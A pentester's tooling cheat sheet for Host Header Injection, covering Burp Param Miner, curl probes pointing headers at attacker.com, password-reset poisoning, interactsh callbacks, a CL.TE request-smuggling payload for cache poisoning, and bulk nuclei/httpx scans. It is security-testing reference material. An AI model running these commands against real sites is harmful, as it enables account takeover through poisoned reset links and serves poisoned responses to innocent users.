---
aliases:
  - HHI Tooling
  - Param Miner Host Header
  - Host Header Wordlists
tags:
  - type/tool
  - vuln/host-header-injection
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[Host Header Injection]]'
  - '[[Burp Suite]]'
---
# Host Header Injection - Tooling

***

## Burp Param Miner

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Extensions → BApp Store → "Param Miner" → Install | Setup extension | Primera vez. |
| Right-click request → "Guess headers" | Auto-discover headers que afectan response | Detect XFH, X-Host, Forwarded. |
| Right-click request → "Identify cache parameters" | Modo dedicado a cache key analysis | HHI + cache combo. |
| Param Miner → Settings → "Force cache miss" → ON | Auto cache buster por request | Avoid cache durante testing. |
| Param Miner Output panel → tab "Param Miner" | Findings + reflection markers | Post-scan review. |
| Right-click → "Active scan" | Scan combinado con HHI checks | Pro feature. |
| BApp Store → "Reflection" → install | Highlight reflected inputs en historial | Pre-detection survey. |
^hhi-tool-paramminer

___

## Custom curl Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Host: attacker.com" https://target/` | Single Host probe | Quick test. |
| `curl -H "X-Forwarded-Host: attacker.com" https://target/` | XFH variant probe | Most common alt. |
| `curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" https://target/forgot -X POST -d "email=victim@target.com"` | Reset poisoning probe | Standard test. |
| `curl --http2 -H ":authority: attacker.com" -H "Host: target.com" https://target/` | HTTP/2 :authority differential | H2 endpoint. |
| `for h in 'Host' 'X-Forwarded-Host' 'X-Host' 'X-HTTP-Host-Override' 'Forwarded'; do curl -sI -H "$h: $(./interactsh-client -url-only)" https://target/forgot; done` | Bulk header probe + Collaborator OOB | Discovery automation. |
| `interactsh-client -v &` y enviar requests con Collaborator host | Watch DNS/HTTP callbacks | OOB confirmation. |
| `diff <(curl -s https://target/) <(curl -s -H "X-Forwarded-Host: attacker" https://target/)` | Response diff oracle | Detection. |
^hhi-tool-curl

### Bash one-liner para detección

```bash
TARGET="https://target.com/forgot"
EMAIL="victim@target.com"
COLLABORATOR_HOST="$(./interactsh-client -url-only)"

HEADERS=(
  "Host: $COLLABORATOR_HOST"
  "X-Forwarded-Host: $COLLABORATOR_HOST"
  "X-Host: $COLLABORATOR_HOST"
  "X-HTTP-Host-Override: $COLLABORATOR_HOST"
  "Forwarded: host=$COLLABORATOR_HOST"
)

for h in "${HEADERS[@]}"; do
  echo "=== $h ==="
  curl -s -X POST -H "Host: target.com" -H "$h" \
    -d "email=$EMAIL" "$TARGET"
done

./interactsh-client -v   # watch callbacks
```

___

## Wordlists

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls PayloadsAllTheThings/Web\ Cache\ Deception` | PayloadsAllTheThings cache + HHI | Foundation. |
| Browser → https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers | HackTricks reference | Lookup completo. |
| `cat /usr/share/seclists/Miscellaneous/web/http-request-headers/* \| sort -u > headers.txt` | SecLists HTTP headers | Wordlist headers. |
| `wget https://wordlists-cdn.assetnote.io/data/manual/http-request-headers.txt` | Assetnote curated headers | Modern. |
| `cat <<EOF > host-vals.txt\nlocalhost\n127.0.0.1\n169.254.169.254\nadmin.internal\napi.internal\nEOF` | Custom Host values list | Internal vhost discovery. |
| `interactsh-client -url-only` | Generate canary URL para OOB | Per-test unique. |
| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cloud/AWS%20-%20Metadata.md` | Cloud metadata IPs reference | SSRF chain. |
^hhi-tool-wordlists

___

## HTTP Smuggler Combo (HRS Extension)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → BApp Store → "HTTP Request Smuggler" → Install | Setup extension HRS | Primera vez. |
| Right-click request → "HTTP Request Smuggler" → "Detect / Smuggle attack" | Auto-detect HRS + smuggle attack panel | Pre-attack identification. |
| Smuggle attack → modify smuggled second request con `X-Forwarded-Host: attacker.com` | Combo HHI via smuggling | HRS + HHI compound. |
| Smuggled cache poison: smuggle GET con XFH attacker → cached | Mass victim impact | Cache poisoning chain. |
| Verificar post-smuggle: `curl https://target/login` (legit user) → recibe poisoned response | Validation cache poisoned | Confirmation. |
| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: attacker.com\r\n\r\n' \| ncat target 80` | Manual CL.TE smuggling con HHI inject | Sin Burp. |
^hhi-tool-smuggler

___

## Otros Tools y Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nuclei -t http/cves/ -l targets.txt -tags hhi` | nuclei templates HHI scanning | Bulk scan. |
| `nuclei -t http/misconfiguration/host-header-injection.yaml -u https://target/forgot` | Specific HHI template | Targeted scan. |
| `httpx -l hosts.txt -path /forgot -H "X-Forwarded-Host: $(interactsh-url)"` | Bulk Host inject probe | Volume testing. |
| ZAP → Active Scan → custom HHI rule | OWASP ZAP free alternative | Sin Burp Pro. |
| `paramspider -d target.com` | URL + param discovery | Recon adjacent. |
| `python3 -c "import requests; r=requests.post('https://target/forgot', headers={'X-Forwarded-Host':'attacker'}, data={'email':'v@t'}); print(r.headers, r.text[:200])"` | Programmable Python probe | Custom logic. |
| `httpx --http2 -l hosts.txt -path /forgot -H ':authority: attacker'` | HTTP/2 :authority bulk | H2 testing. |
^hhi-tool-others

***
